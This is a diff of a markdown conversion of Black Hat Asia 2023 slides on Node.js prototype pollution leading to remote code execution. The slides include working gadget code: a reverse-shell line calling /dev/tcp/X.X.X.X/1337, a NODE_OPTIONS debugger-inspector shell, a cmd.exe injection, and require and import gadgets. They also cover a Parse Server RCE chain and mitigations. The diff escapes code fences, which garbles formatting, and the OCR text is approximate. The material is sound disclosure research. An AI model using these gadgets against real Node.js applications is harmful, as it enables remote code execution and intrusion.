@@ -8,19 +8,25 @@ year: 2023
 source_pdf: "Black Hat Asia 2023 slides/AS-23-Shcherbakov-Prototype-Pollution-Leads-to-RCE.pdf"
 pages: 53
 sha256: "e7b1c1cad7b213e8aec450c54b021c057f99bf5f3a8c61a2a0c46d6e80a37658"
-text_chars: 22816
+text_chars: 22890
 ocr_pages: 2
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 88.0
+ocr_unreliable_blocks: 0
+vision_verified_blocks: 1
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:55:32Z"
+converted_at: "2026-08-12T03:48:48Z"
 ---
 # Prototype Pollution Leads to RCE
 
 **Speakers:** Shcherbakov  
 **Conference:** Black Hat ASIA 2023  
 **Source:** `Black Hat Asia 2023 slides/AS-23-Shcherbakov-Prototype-Pollution-Leads-to-RCE.pdf` (53 pages)
+
 
 ## Slide 1
 
@@ -30,10 +36,10 @@ Mikhail Shcherbakov
 
 #BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pidek hat
 ASIA &
 MAY 11-12
 BRIEFINGS
@@ -115,9 +121,9 @@ Mikhail Shcherbakov
 
 ## Prototype-based inheritance in JS
 
-```
+\```
 consto1= {};
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -125,10 +131,10 @@ consto1= {};
 
 ## Prototype-based inheritance in JS
 
-```
+\```
 consto1= {};
 o1.__proto__.x= 42;
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -136,13 +142,13 @@ o1.__proto__.x= 42;
 
 ## Prototype-based inheritance in JS
 
-```
+\```
 consto1= {};
 o1.__proto__.x= 42;
 consto2= {};
 console.log(o2.x);
 // Output: 42
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -209,14 +215,14 @@ obj[lastProp] = diff.value;
 
 ## NPM CLI Gadget
 
-```
+\```
 constgitEnv= {
 GIT_ASKPASS:'echo',
 GIT_SSH_COMMAND:'ssh-oStrictHostKeyChecking=accept-new’
 }
-```
+\```
 
-```
+\```
 function makeOpts(opts = {})
 return {
 stdioString:true,
@@ -224,7 +230,7 @@ stdioString:true,
 shell:false,
 env:opts.env|| { ...gitEnv, ...process.env}
 }
-```
+\```
 
 `}` **undefined obj w/ prototype** `require('child_process').spawn(gitPath, args, makeOpts(opts))`
 
@@ -250,37 +256,37 @@ Search by **child_process** by grep, Semgrep or CodeQL Search in a distributed p
 
 ## child_process Implementation
 
-```
+\```
 functionspawn(file, args,options) {
-```
+\```
 
-```
+\```
 options= normalizeSpawnArguments(file, args, options);
 /* ... */
 }
-```
+\```
 
 `function normalizeSpawnArguments(file, args,` `options` `) { if` `(options` `=== undefined)` `options` `= {};` **obj w/ prototype**
 
-```
+\```
 constenv= options.env|| process.env;
 constenvPairs= [];
-```
+\```
 
-```
+\```
 // Prototype values are intentionally included.
 for(constkeyinenv) {
-```
+\```
 
-```
+\```
 ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
 }
-```
+\```
 
-```
+\```
 return{ ...options,  envPairs,  /* ... */ };
 }
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -288,40 +294,40 @@ return{ ...options,  envPairs,  /* ... */ };
 
 ## child_process Implementation
 
-```
+\```
 functionspawn(file, args, options) {
-```
+\```
 
-```
+\```
 options= normalizeSpawnArguments(file, args, options);
 /* ... */
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 functionnormalizeSpawnArguments(file, args, options) {
 if(options=== undefined)
 options= {};
-```
+\```
 
-```
+\```
 constenv= options.env|| process.env;
 constenvPairs= [];
-```
+\```
 
-```
+\```
 // Prototype values are intentionally included.
 for(constkeyinenv) {
-```
+\```
 
-```
+\```
 varoptions= {
-```
+\```
 
-```
+\```
 cwd:process.cwd,
 env:process.env,
 argv0:process.argv[0],
@@ -334,17 +340,17 @@ shell:false, // can be a string
 timeout:undefined,
 /* ... */
 }
-```
+\```
 
-```
+\```
 ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
 }
-```
+\```
 
-```
+\```
 return{ ...options,  envPairs,  /* ... */ };
 }
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -352,36 +358,36 @@ return{ ...options,  envPairs,  /* ... */ };
 
 ## child_process Implementation
 
-```
+\```
 functionspawn(file, args, options) {
-```
+\```
 
-```
+\```
 options= normalizeSpawnArguments(file, args, options);
 /* ... */
 }
-```
+\```
 
-```
+\```
 functionnormalizeSpawnArguments(file, args, options) {
 if(options=== undefined)
-```
+\```
 
-```
+\```
 options= {};
-```
+\```
 
-```
+\```
 constenv= options.env|| process.env;
 constenvPairs= [];
-```
+\```
 
-```
+\```
 // Prototype values are intentionally included.
 for(constkeyinenv) {
-```
+\```
 
-```
+\```
 varoptions= {
 cwd:process.cwd,
 env:process.env,
@@ -395,17 +401,17 @@ shell:false, // can be a string
 timeout:undefined,
 /* ... */
 }
-```
+\```
 
-```
+\```
 ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
 }
-```
+\```
 
-```
+\```
 return{ ...options,  envPairs,  /* ... */ };
 }
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -413,7 +419,7 @@ return{ ...options,  envPairs,  /* ... */ };
 
 ## child_process Gadget I (Windows)
 
-```
+\```
 const{ execSync} = require('child_process’);
 // Prototype pollution
 Object.prototype.shell= 'cmd.exe.';
@@ -422,7 +428,7 @@ Object.prototype.input= 'echo PWNED\n’;
 constoutput= execSync('ping 127.0.0.1');
 console.log(output.toString());
 // Output: PWNED
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -430,21 +436,21 @@ console.log(output.toString());
 
 ## child_process Gadget II (Cross-Platf.)
 
-```
+\```
 const{ spawnSync} = require('child_process');
-```
+\```
 
-```
+\```
 // Prototype pollution
 Object.prototype.shell= "/usr/local/bin/node";
 Object.prototype.NODE_OPTIONS= '--inspect-brk=0.0.0.0:1337’;
 // Gadget
-```
+\```
 
-```
+\```
 constoutput= spawnSync('ping', ['-c', '4', '127.0.0.1']);
 console.log(output.toString());
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -452,35 +458,35 @@ console.log(output.toString());
 
 ## Shell for Gadget II (Cross-Platf.)
 
-```
+\```
 constclient= newrequire('lib/internal/inspect_client.js')();
 awaitclient.connect(1337, 'X.X.X.X');
-```
+\```
 
 - `// Set callbacks`
 
-```
+\```
 awaitclient.addListener('Debugger.paused', async() =>{
 letoutput= awaitclient.callMethod("Runtime.evaluate", {
 expression:`require('child_process').execSync('${cmd}').toString()`
 });
-```
+\```
 
 - `});`
 
-```
+\```
 awaitclient.callMethod("Runtime.evaluate", {
 expression:"process.on('exit', (code) => {debugger;})"
 });
-```
+\```
 
-```
+\```
 // Continue execution
-```
+\```
 
-```
+\```
 awaitclient.callMethod("Runtime.runIfWaitingForDebugger");
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -502,28 +508,28 @@ awaitclient.callMethod("Runtime.runIfWaitingForDebugger");
 
 ## child_process Michał’s Gadget (Linux)
 
-```
+\```
 const{ spawn} = require('child_process');
-```
+\```
 
-```
+\```
 // Prototype pollution
 Object.prototype.env= {
-```
+\```
 
-```
+\```
 AAAA:'require("child_process").execSync("bash -i>& /dev/tcp/X.X.X.X/1337 0>&1");//',
 NODE_OPTIONS:'--require /proc/self/environ'
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 // Gadget
 spawn('node', ['app.js']);
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -545,17 +551,17 @@ It is nice that we can exploit prototype pollution in _spawn_ but would be even 
 
 ## require Gadget
 
-```
+\```
 // Prototype pollution
 Object.prototype.main=
 '/home/user/path/to/malicious.js';
-```
+\```
 
-```
+\```
 // Gadget requires the absence of
 // mainproperty in package.json
 constbytes=require('bytes');
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -563,57 +569,57 @@ constbytes=require('bytes');
 
 ## require Gadget
 
-```
+\```
 // Prototype pollution
 Object.prototype.main=
 '/home/user/path/to/malicious.js';
-```
+\```
 
-```
+\```
 // Gadget requires the absence of
 // main property in package.json
 constbytes=require('bytes');
-```
+\```
 
-```
+\```
 // lib\internal\modules\cjs\loader.js
 constjsonPath= path.resolve(dir, 'package.json');
-```
+\```
 
-```
+\```
 constjson= packageJsonReader.read(jsonPath).str;
 if(json=== undefined) {
-```
+\```
 
-```
+\```
 returnfalse;
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 constparsed=JSON.Parse(json);
 constfiltered= {
-```
+\```
 
-```
+\```
 main:parsed.main,
-```
+\```
 
-```
+\```
 exports:parsed.exports,
 /* ... */
-```
+\```
 
-```
+\```
 };
-```
+\```
 
-```
+\```
 returnfiltered;
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -621,7 +627,7 @@ returnfiltered;
 
 ## Gadget Cocktail
 
-```
+\```
 // Prototype pollution
 Object.prototype.main=
 "/usr/XXX.js"
@@ -629,7 +635,7 @@ Object.prototype.NODE_OPTIONS=
 "--inspect-brk=0.0.0.0:1337";
 // Gadget
 constbytes=require('bytes');
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -637,28 +643,28 @@ constbytes=require('bytes');
 
 ## Gadget Cocktail
 
-```
+\```
 // Prototype pollution
 Object.prototype.main=
 "/usr/lib/node_modules/corepack/dist/npm.js"
 Object.prototype.NODE_OPTIONS=
 "--inspect-brk=0.0.0.0:1337";
-```
+\```
 
-```
+\```
 // corepack/dist/npm.js
 #!/usr/bin/envnode
-```
+\```
 
-```
+\```
 require('./corepack’)
 .runMain(['npm', ...args]);
-```
+\```
 
-```
+\```
 // Gadget
 constbytes=require('bytes');
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -672,28 +678,28 @@ constbytes=require('bytes');
 
 - Emulate the polluted property by an unenumerable property in _Object.prototype_ . `Object.defineProperty(Object.prototype, 'main', {`
 
-```
+\```
 get(){
-```
+\```
 
-```
+\```
 if(this['main___']) returnthis['main___'];
 console.log('MAIN DETECTED');
 returnundefined;
-```
+\```
 
-```
+\```
 },
-```
+\```
 
-```
+\```
 set(val){ this['main___'] = val},
 enumerable:false
-```
+\```
 
-```
+\```
 });
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -713,11 +719,11 @@ enumerable:false
 
    - `require('fs').writeFileSync(`
 
-```
+\```
 'loaded-packages.txt',
 Object.keys(require.cache).join('\n')
 )
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -755,34 +761,34 @@ Object.keys(require.cache).join('\n')
 
 ## child_process Implementation
 
-```
+\```
 functionspawn(file, args,options) {
 options= normalizeSpawnArguments(file, args,options);
 /* ... */
 }
-```
+\```
 
 `function normalizeSpawnArguments(file, args,` `options` `) { if` `(options` `=== undefined)` `options` `= {};` **obj w/ prototype**
 
-```
+\```
 constenv= options.env|| process.env;
 constenvPairs= [];
-```
+\```
 
-```
+\```
 // Prototype values are intentionally included.
 for(constkeyinenv) {
-```
+\```
 
-```
+\```
 ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
 }
-```
+\```
 
-```
+\```
 return{ ...options,  envPairs,  /* ... */ };
 }
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -790,38 +796,38 @@ return{ ...options,  envPairs,  /* ... */ };
 
 ## child_process Mitigations
 
-```
+\```
 constkEmptyObject= ObjectFreeze({ __proto__:null});
 functionspawn(file, args,options) {
-```
+\```
 
-```
+\```
 options= normalizeSpawnArguments(file, args,options);
 /* ... */
 }
-```
+\```
 
 `function normalizeSpawnArguments(file, args,` `options` `) { if` `(options` `=== undefined)` `options` `= kEmptyObject;` **obj w/o prototype**
 
-```
+\```
 constenv= options.env|| process.env;
 constenvPairs= [];
-```
+\```
 
-```
+\```
 // Prototype values are intentionally included.
 for(constkeyinenv) {
-```
+\```
 
-```
+\```
 ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
 }
-```
+\```
 
-```
+\```
 return{ ...options,  envPairs,  /* ... */ };
 }
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -829,41 +835,41 @@ return{ ...options,  envPairs,  /* ... */ };
 
 ## child_process Mitigations
 
-```
+\```
 constkEmptyObject= ObjectFreeze({ __proto__:null});
 functionspawn(file, args, options) {
-```
+\```
 
-```
+\```
 options= normalizeSpawnArguments(file, args, options);
 /* ... */
 }
-```
+\```
 
-```
+\```
 functionnormalizeSpawnArguments(file, args, options) {
 if(options=== undefined)
-```
+\```
 
 `options = kEmptyObject; const` `env` `= options.env || process` `.env` `;` **obj w/ prototype** `const envPairs = [];`
 
-```
+\```
 // Prototype values are intentionally included.
 for(constkeyinenv) {
-```
+\```
 
-```
+\```
 ArrayPrototypePush(envPairs, `${key}=${env[key]}`);
 }
-```
+\```
 
-```
+\```
 return{ ...options,  envPairs,  /* ... */ };
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -879,39 +885,39 @@ return{ ...options,  envPairs,  /* ... */ };
 
 ## require Implementation
 
-```
+\```
 // lib\internal\modules\cjs\loader.js
 constjsonPath= path.resolve(dir, 'package.json');
-```
+\```
 
-```
+\```
 constjson= packageJsonReader.read(jsonPath).str;
 if(json=== undefined) {
-```
+\```
 
-```
+\```
 returnfalse;
 }
-```
+\```
 
-```
+\```
 constparsed=JSON.Parse(json);
 constfiltered= {
-```
+\```
 
-```
+\```
 main:parsed.main,
 exports:parsed.exports,
 /* ... */
-```
+\```
 
-```
+\```
 };
-```
+\```
 
-```
+\```
 returnfiltered;
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -919,19 +925,19 @@ returnfiltered;
 
 ## require Mitigations
 
-```
+\```
 // lib\internal\modules\cjs\loader.js
 constjsonPath= path.resolve(dir, 'package.json');
-```
+\```
 
-```
+\```
 constjson= packageJsonReader.read(jsonPath).str;
 if(json=== undefined) {
 returnfalse;
 }
-```
+\```
 
-```
+\```
 constfiltered=filterOwnProperties(JSONParse(json),
 [
 'name',
@@ -940,11 +946,11 @@ constfiltered=filterOwnProperties(JSONParse(json),
 'imports',
 'type',
 ]);
-```
+\```
 
-```
+\```
 returnfiltered;
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -952,50 +958,50 @@ returnfiltered;
 
 ## New require Gadget
 
-```
+\```
 // Prototype pollution
 Object.prototype.main=
 '/home/user/path/to/malicious.js';
-```
+\```
 
-```
+\```
 // Gadget requires the absence of
 // package.jsonin the directory
 constbytes=require('./dir');
-```
+\```
 
-```
+\```
 // lib\internal\modules\cjs\loader.js
 constjsonPath= path.resolve(dir, 'package.json');
-```
+\```
 
-```
+\```
 constjson= packageJsonReader.read(jsonPath).str;
 if(json=== undefined) {
-```
+\```
 
-```
+\```
 returnfalse;
 }
-```
+\```
 
-```
+\```
 constfiltered= filterOwnProperties(JSONParse(json),
 [
-```
+\```
 
-```
+\```
 'name',
 'main',
 'exports',
 'imports',
 'type',
 ]);
-```
+\```
 
-```
+\```
 returnfiltered;
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -1003,13 +1009,13 @@ returnfiltered;
 
 ## New import Gadget
 
-```
+\```
 // Prototype pollution
 Object.prototype.source= 'console.log("PWNED")';
 // Gadget
 import('./file.mjs')
 // Output: PWNED
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -1037,15 +1043,15 @@ We continue our research of gadget detection in Node.js stdlib and 3<sup>rd</sup
 
 ## Parse Server Attacker Model
 
-```
+\```
 functionexpandResultOnKeyPath(obj, key, res) {
 if(key.indexOf('.') < 0) {
 obj[key] = res[key];
 returnobj;
 }
-```
+\```
 
-```
+\```
 constpath= key.split('.');
 constfirstKey= path[0];
 constnextPath= path.slice(1).join('.');
@@ -1054,17 +1060,17 @@ obj[firstKey] || {},
 nextPath, res[firstKey]);
 returnobj;
 }
-```
+\```
 
 PP
 
-```
+\```
 js-bson
-```
+\```
 
 RCE
 
-```
+\```
 constevalFunctions=
 options['evalFunctions'] == null
 ? false
@@ -1072,7 +1078,7 @@ options['evalFunctions'] == null
 if(evalFunctions) {
 eval(functionString);
 }
-```
+\```
 
 #BHASIA @BlackHatEvents
 
@@ -1080,34 +1086,38 @@ eval(functionString);
 
 #BHASIA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-res yuske @ubuntu: ~/src/parse-server-bootstrap Q = - o © {/home/yuske/src} - Far 2.3 20211219-ae94eF3 x64 yuske@ubuntu - Oo ®&
-endency f= .../yuske/src/parse-server-bootstrap =|
-(node:54833) Warning: Accessing non-existent property 'remove' of module exports inside circular depe ||" Name Name n Name Name
-ndenc oe ae
-Vande sanas) Warning: Accessing non-existent property 'updateOne' of module exports inside circular d |icloud fastjson
-Se eiectrecton true logs infer A
-appId: appo node_modules JavaAnalysis
-appName: TestApp public node-tests
-cacheMaxSize: 10000 config. json npm-rce-git-hijacki}
-cacheTTL: 5000 package. json parse-server -bootst}
-Petipa tal package- lock. json prototype-pollution}
-databaseURI: mongodb://127.0.0.1:27017/parse pwnphare
-enableAnonymousUsers: true radamsa
-expireInactiveSessions: true parse-server-expLoi}
-graphQLPath: /graphql test.js
+[Terminal window title: yuske@ubuntu: ~/src/parse-server-bootstrap]
+
+endency
+(node:54833) Warning: Accessing non-existent property 'remove' of module exports inside circular depe
+ndency
+(node:54833) Warning: Accessing non-existent property 'updateOne' of module exports inside circular d
+ependency
+allowClientClassCreation: true
+appId: app0
+appName: TestApp
+cacheMaxSize: 10000
+cacheTTL: 5000
+cloud: ./cloud/main
+customPages: {}
+databaseURI: mongodb://127.0.0.1:27017/parse
+enableAnonymousUsers: true
+expireInactiveSessions: true
+graphQLPath: /graphql
 host: 0.0.0.0
 logsFolder: ./logs
 masterKey: ***REDACTED***
-masterKeylIps: []
+masterKeyIps: []
 maxUploadSize: 20mb
 mountPath: /parse
 objectIdSize: 10
 playgroundPath: /playground
 port: 1337
-protectedFields: {"_User":{"*":[ "email" ]}}
+protectedFields: {"_User":{"*":["email"]}}
 revokeSessionOnPasswordReset: true
 schemaCacheTTL: 5000
 sessionLength: 31536000
@@ -1127,10 +1137,41 @@ jsonLogs: false
 verbose: false
 level: undefined
 serverURL: http://localhost:1337/parse
-"S4@ BDO SG
-json yuske yuske 353386 20/12/21 08:08]||/t.sh yuske yuske 2817 20/12/21 09:37
-353 720 bytes in 3 files 2 866 bytes in 2 files
-oie parse-server running on http://localhost:1337/parse [ ae Se ’
+
+[54833] parse-server running on http://localhost:1337/parse
+
+[Right window title: {/home/yuske/src} - Far 2.3 20211219-ae94ef3 x64 yuske@ubuntu     09:39]
+
+Left panel: .../yuske/src/parse-server-bootstrap
+n   Name          Name
+..
+cloud
+logs
+node_modules
+public
+config.json
+package.json
+package-lock.json
+
+Right panel: /home/yuske/src
+n   Name          Name
+..
+fastjson
+infer
+JavaAnalysis
+node-tests
+npm-rce-git-hijacki}
+parse-server-bootst}
+prototype-pollution}
+pwnphare
+radamsa
+parse-server-exploi}   [highlighted]
+test.js
+
+json yuske  yuske  353386 20/12/21 08:08     t.sh yuske  yuske  2817 20/12/21 09:37
+     353 720 bytes in 3 files                     2 866 bytes in 2 files
+/home/yuske/src$
+1Help 2UserMn 3View 4Edit 5Copy 6RenMov 7MkFold 8Delete 9ConfMn 10Quit
 ```
 
 ## Slide 46
@@ -1159,9 +1200,9 @@ oie parse-server running on http://localhost:1337/parse [ ae Se ’
 
 - Prevent infinite recursion in your payload.
 
-```
+\```
 Object.prototype.foo= { 'foo':null};
-```
+\```
 
 - `({}).foo.foo === null;`
 
@@ -1177,9 +1218,9 @@ Object.prototype.foo= { 'foo':null};
 
 - Prevent infinite recursion in your payload.
 
-```
+\```
 Object.prototype.foo= { '__proto__':null};
-```
+\```
 
 - `({}).foo.foo === undefined;`
 
@@ -1255,8 +1296,8 @@ Object.prototype.foo= { '__proto__':null};
 
 **Thank you for your attention! kth.se/profile/msh** Thanks for your attention! **twitter.com/yu5k github.com/yuske c 3** `#61` https://twitter.com/yu5k3
 
-```
+\```
 #61
-```
+\```
 
 #BHASIA @BlackHatEvents
